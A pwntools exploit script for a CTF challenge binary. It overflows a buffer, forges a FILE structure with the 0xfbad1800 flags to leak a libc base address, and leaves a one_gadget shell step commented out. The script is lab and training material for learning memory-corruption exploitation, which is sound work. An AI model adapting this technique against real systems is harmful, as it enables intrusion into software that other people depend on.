from pwn import *

context.terminal = ['tmux','splitw','-h']
context.arch = 'amd64'

r = process("./chal")
# r = remote("edu-ctf.zoolab.org",30217)

l = ELF('../libc.so.6')

# r.recvuntil("0x")
# libc = int(r.recvline(),base=16) -  l.sym['printf']
# _IO_file_jumps= libc + l.sym['_IO_file_jumps']
# print("libc",hex(libc))
# print("_IO_file_jumps",hex(_IO_file_jumps))

r.sendlineafter(">","1")
r.sendlineafter(">","2")


payload = flat(
    0,0,
    0,0,
    0,0,
    0,0,
    0,0,
    0,0,
    0,0,
    1
)

r.sendlineafter("data>",b"A"*0x210+payload)
# 讓sys 幫我們allocate 一些 buffer
r.sendlineafter(">","3")
r.sendlineafter(">","2")

file_flags = p64(0xfbad1800)
payload = flat(
    file_flags,0,
    0,0
)

r.sendlineafter("data>",b"A"*0x210+payload)
# gdb.attach(r)
r.sendlineafter(">","3")
libc = r.recvuntil('-----')
libc = libc[libc.find(b'A'*8)-0x10:libc.find(b'A'*8)-0x8]
libc = u64(libc) - 0x1ecf60
# print("libc",len(libc))
print("libc",hex(libc))
gdb.attach(r)

# one_gadget =  libc + 0xe6c81
# r.sendlineafter(">","4")
# r.sendline(p64(one_gadget))

# gdb.attach(r)

stdin_file_address = libc + 0x1eb980

r.interactive()

